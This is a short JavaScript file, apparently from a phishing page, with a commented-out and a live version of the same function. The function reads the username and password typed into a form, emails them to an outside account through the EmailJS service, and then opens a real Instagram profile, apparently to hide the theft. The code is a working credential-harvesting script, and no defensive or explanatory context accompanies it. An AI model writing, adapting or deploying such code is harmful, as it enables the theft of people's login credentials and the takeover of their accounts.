// function async sendmail(){
//     let temppara = {
//         user_name : document.getElementById("username").value,
//         user_passw : document.getElementById("passw").value
//     }
//     await emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
//     .then(function (res){
//             window.open("https://www.instagram.com/sskk.450/");
//         console.log("succeeed")
//     })
// }
const sendmail =async ()=>{
    let temppara = {
        user_name : document.getElementById("username").value,
        user_passw : document.getElementById("passw").value
    }
    await emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
    .then(function (res){
            window.open("https://www.instagram.com/sskk.450/");
        console.log("succeeed")
    })
}
